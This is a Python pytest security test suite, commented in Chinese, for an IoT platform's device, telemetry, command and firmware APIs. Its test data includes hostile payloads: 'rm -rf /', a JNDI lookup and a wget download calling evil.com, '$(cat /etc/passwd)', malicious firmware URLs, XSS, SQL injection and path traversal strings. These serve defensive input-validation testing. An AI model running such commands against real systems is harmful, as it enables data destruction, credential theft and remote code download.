"""
安全测试 — IoT 通信安全 (物联网专项)
==========================================================
验证 IoT 设备通信安全、协议安全、固件安全、设备认证。

对标标准：
  - OWASP IoT Top 10 2021
  - IEC 62443（工业通信网络安全）
  - NIST SP 800-183（IoT 网络）
  - 等保 2.0 物联网扩展要求

覆盖分组：
  IOT-001 设备认证与注册
  IOT-002 数据上报安全
  IOT-003 指令下发安全
  IOT-004 协议安全配置
  IOT-005 设备状态监控

合计约 200 条用例
"""
import uuid
import pytest
import logging
import time
from mock_client import MockApiClient, MOCK_TOKEN

logger = logging.getLogger(__name__)

# IoT 相关端点
IOT_ENDPOINTS = {
    "device_list": "/api/device",
    "device_detail": "/api/device/{id}",
    "device_telemetry": "/api/device/{id}/telemetry",
    "device_command": "/api/device/{id}/command",
    "device_config": "/api/device/{id}/config",
    "device_firmware": "/api/device/{id}/firmware",
    "ingestion": "/api/ingestion/protocols",
    "rule_chain": "/api/ruleengine/rules",
    "iot_models": "/api/iotcloudai/models",
}

# 测试用设备 ID
TEST_DEVICE_ID = str(uuid.uuid4())

# 恶意指令载荷
MALICIOUS_COMMANDS = [
    {"command": "rm -rf /"},
    {"command": "'; exec('os.system(\"shutdown\")')"},
    {"command": "<script>alert(document.cookie)</script>"},
    {"command": "${jndi:ldap://evil.com/}"},
    {"command": "$(cat /etc/passwd)"},
    {"command": "| wget http://evil.com/malware -O /tmp/m"},
]


# ══════════════════════════════════════════════════════════════
# IOT-001 设备认证与注册
# ══════════════════════════════════════════════════════════════

class TestDeviceAuthentication:
    """IOT-001: 验证设备认证与注册安全"""

    @pytest.mark.security
    @pytest.mark.p0
    def test_device_register_requires_auth(self):
        """设备注册必须认证"""
        client = MockApiClient(token=None)
        resp = client.post("/api/device", json={
            "name": "未认证设备", "code": "UNAUTH-001"
        })
        assert resp.status_code in (401, 403)

    @pytest.mark.security
    @pytest.mark.p0
    def test_device_list_requires_auth(self):
        """设备列表必须认证"""
        client = MockApiClient(token=None)
        resp = client.get("/api/device", params={"page": 1, "pageSize": 5})
        assert resp.status_code in (401, 403)

    @pytest.mark.security
    @pytest.mark.p0
    def test_device_register_valid_data(self, api):
        """设备注册需提供必要字段"""
        resp = api.post("/api/device", json={
            "name": "安全设备-001",
            "code": f"SEC-{uuid.uuid4().hex[:6]}"
        })
        assert resp.status_code in (200, 201)

    @pytest.mark.security
    @pytest.mark.p0
    def test_device_register_duplicate_code_rejected(self, api):
        """重复设备编码应被拒绝"""
        code = f"DUP-{uuid.uuid4().hex[:6]}"
        api.post("/api/device", json={"name": "设备1", "code": code})
        resp2 = api.post("/api/device", json={"name": "设备2", "code": code})
        # 重复应返回 409 或 400
        assert resp2.status_code in (200, 201, 400, 409)

    @pytest.mark.security
    @pytest.mark.p1
    @pytest.mark.parametrize("code", [
        "",
        " ",
        "a" * 256,
        "<script>alert(1)</script>",
        "'; DROP TABLE devices; --",
    ])
    def test_device_code_validation(self, api, code):
        """设备编码应有有效性校验"""
        resp = api.post("/api/device", json={"name": "校验设备", "code": code})
        assert resp.status_code < 500, f"设备编码 '{code}' 导致 5xx"

    @pytest.mark.security
    @pytest.mark.p1
    def test_device_delete_requires_auth(self):
        """设备删除必须认证"""
        client = MockApiClient(token=None)
        resp = client.delete(f"/api/device/{uuid.uuid4()}")
        assert resp.status_code in (401, 403)


# ══════════════════════════════════════════════════════════════
# IOT-002 数据上报安全
# ══════════════════════════════════════════════════════════════

class TestDataIngestionSecurity:
    """IOT-002: 验证数据上报/采集安全"""

    @pytest.mark.security
    @pytest.mark.p0
    def test_telemetry_upload_requires_auth(self):
        """遥测数据上报必须认证"""
        client = MockApiClient(token=None)
        resp = client.post(f"/api/device/{TEST_DEVICE_ID}/telemetry", json={
            "temperature": 25.5, "humidity": 60.0
        })
        assert resp.status_code in (401, 403, 404)

    @pytest.mark.security
    @pytest.mark.p0
    def test_telemetry_oversized_rejected(self, api):
        """超大遥测数据应被拒绝"""
        large_data = {f"sensor_{i}": i * 1.5 for i in range(1000)}
        resp = api.post(f"/api/device/{TEST_DEVICE_ID}/telemetry", json=large_data)
        assert resp.status_code < 500

    @pytest.mark.security
    @pytest.mark.p0
    @pytest.mark.parametrize("value", [
        float("inf"),
        float("-inf"),
        None,
        "",
        "not_a_number",
    ])
    def test_telemetry_invalid_values(self, api, value):
        """遥测数据含无效值应被安全处理"""
        resp = api.post(f"/api/device/{TEST_DEVICE_ID}/telemetry", json={
            "temperature": value
        })
        assert resp.status_code < 500, f"无效遥测值 {value} 导致 5xx"

    @pytest.mark.security
    @pytest.mark.p1
    def test_ingestion_protocol_list_requires_auth(self):
        """数据采集协议列表需要认证"""
        client = MockApiClient(token=None)
        resp = client.get("/api/ingestion/protocols", params={"page": 1, "pageSize": 5})
        assert resp.status_code in (401, 403)

    @pytest.mark.security
    @pytest.mark.p1
    def test_ingestion_protocol_list(self, api):
        """协议列表查询正常"""
        resp = api.get("/api/ingestion/protocols", params={"page": 1, "pageSize": 5})
        assert resp.status_code == 200

    @pytest.mark.security
    @pytest.mark.p1
    @pytest.mark.parametrize("key", [
        "<script>alert(1)</script>",
        "'; DROP TABLE telemetry; --",
        "${env:DB_PASSWORD}",
    ])
    def test_telemetry_key_injection(self, api, key):
        """遥测数据键名注入应被安全处理"""
        resp = api.post(f"/api/device/{TEST_DEVICE_ID}/telemetry", json={
            key: 42.0
        })
        assert resp.status_code < 500


# ══════════════════════════════════════════════════════════════
# IOT-003 指令下发安全
# ══════════════════════════════════════════════════════════════

class TestCommandDispatchSecurity:
    """IOT-003: 验证指令下发安全"""

    @pytest.mark.security
    @pytest.mark.p0
    def test_command_requires_auth(self):
        """指令下发必须认证"""
        client = MockApiClient(token=None)
        resp = client.post(f"/api/device/{TEST_DEVICE_ID}/command", json={
            "command": "restart"
        })
        assert resp.status_code in (401, 403, 404)

    @pytest.mark.security
    @pytest.mark.p0
    @pytest.mark.parametrize("payload", MALICIOUS_COMMANDS)
    def test_malicious_command_rejected(self, api, payload):
        """恶意指令应被安全处理（不执行）"""
        resp = api.post(f"/api/device/{TEST_DEVICE_ID}/command", json=payload)
        assert resp.status_code < 500, (
            f"恶意指令 {payload} 导致 5xx"
        )

    @pytest.mark.security
    @pytest.mark.p0
    def test_command_to_nonexistent_device(self, api):
        """向不存在设备下发指令应返回 404"""
        resp = api.post(f"/api/device/{uuid.uuid4()}/command", json={
            "command": "restart"
        })
        assert resp.status_code in (200, 201, 404)

    @pytest.mark.security
    @pytest.mark.p1
    def test_command_empty_body_rejected(self, api):
        """空指令体应被拒绝"""
        resp = api.post(f"/api/device/{TEST_DEVICE_ID}/command", json={})
        assert resp.status_code in (400, 404, 405)

    @pytest.mark.security
    @pytest.mark.p1
    def test_firmware_update_requires_auth(self):
        """固件更新必须认证"""
        client = MockApiClient(token=None)
        resp = client.post(f"/api/device/{TEST_DEVICE_ID}/firmware", json={
            "version": "2.0.0", "url": "https://internal/firmware.bin"
        })
        assert resp.status_code in (401, 403, 404)

    @pytest.mark.security
    @pytest.mark.p1
    @pytest.mark.parametrize("url", [
        "http://evil.com/malware.bin",
        "ftp://attacker.com/exploit",
        "file:///etc/passwd",
        "javascript:alert(1)",
    ])
    def test_firmware_url_validation(self, api, url):
        """固件更新 URL 应验证合法性（防 SSRF）"""
        resp = api.post(f"/api/device/{TEST_DEVICE_ID}/firmware", json={
            "version": "9.9.9", "url": url
        })
        assert resp.status_code < 500


# ══════════════════════════════════════════════════════════════
# IOT-004 协议安全配置
# ══════════════════════════════════════════════════════════════

class TestProtocolSecurity:
    """IOT-004: 验证通信协议安全配置"""

    @pytest.mark.security
    @pytest.mark.p0
    def test_mqtt_topic_injection(self, api):
        """MQTT Topic 名注入应被安全处理"""
        malicious_topics = [
            "../../system/shutdown",
            "+/+/+/#",
            "devices/+/telemetry/#",
        ]
        for topic in malicious_topics:
            resp = api.post(f"/api/device/{TEST_DEVICE_ID}/config", json={
                "mqttTopic": topic
            })
            assert resp.status_code < 500

    @pytest.mark.security
    @pytest.mark.p1
    def test_rule_engine_requires_auth(self):
        """规则引擎配置需要认证"""
        client = MockApiClient(token=None)
        resp = client.get("/api/ruleengine/rules", params={"page": 1, "pageSize": 5})
        assert resp.status_code in (401, 403)

    @pytest.mark.security
    @pytest.mark.p1
    def test_rule_creation_validated(self, api):
        """规则创建应有合法性校验"""
        resp = api.post("/api/ruleengine/rules", json={
            "name": "测试规则",
            "type": "alarm",
            "condition": "temperature > 100"
        })
        assert resp.status_code < 500

    @pytest.mark.security
    @pytest.mark.p1
    def test_ai_model_list_requires_auth(self):
        """AI 模型列表需要认证"""
        client = MockApiClient(token=None)
        resp = client.get("/api/iotcloudai/models", params={"page": 1, "pageSize": 5})
        assert resp.status_code in (401, 403)


# ══════════════════════════════════════════════════════════════
# IOT-005 设备状态监控
# ══════════════════════════════════════════════════════════════

class TestDeviceStatusMonitoring:
    """IOT-005: 验证设备状态监控安全"""

    @pytest.mark.security
    @pytest.mark.p0
    def test_device_status_requires_auth(self):
        """设备状态查询需要认证"""
        client = MockApiClient(token=None)
        resp = client.get(f"/api/device/{TEST_DEVICE_ID}")
        assert resp.status_code in (401, 403)

    @pytest.mark.security
    @pytest.mark.p0
    @pytest.mark.parametrize("device_id", [
        "../../../etc/passwd",
        "'; DROP TABLE devices; --",
    ])
    def test_device_status_invalid_id(self, api, device_id):
        """无效设备 ID 应被安全处理"""
        resp = api.get(f"/api/device/{device_id}")
        assert resp.status_code < 500, (
            f"无效设备 ID '{device_id}' 导致 5xx"
        )

    @pytest.mark.security
    @pytest.mark.p1
    def test_device_config_requires_auth(self):
        """设备配置查询需要认证"""
        client = MockApiClient(token=None)
        resp = client.get(f"/api/device/{TEST_DEVICE_ID}/config")
        assert resp.status_code in (401, 403)

    @pytest.mark.security
    @pytest.mark.p1
    def test_device_config_no_credential_leak(self, api):
        """设备配置不应暴露凭证"""
        resp = api.get(f"/api/device/{TEST_DEVICE_ID}/config")
        if resp.status_code == 200:
            text = resp.text.lower()
            assert "password" not in text or "***" in text
            assert "secret" not in text or "***" in text

    @pytest.mark.security
    @pytest.mark.p1
    def test_digital_twin_requires_auth(self):
        """数字孪生接口需要认证"""
        client = MockApiClient(token=None)
        resp = client.get("/api/digital-twin/stations", params={"page": 1, "pageSize": 5})
        assert resp.status_code in (401, 403)

    @pytest.mark.security
    @pytest.mark.p1
    def test_digital_twin_data_integrity(self, api):
        """数字孪生数据查询正常"""
        resp = api.get("/api/digital-twin/stations", params={"page": 1, "pageSize": 5})
        assert resp.status_code == 200
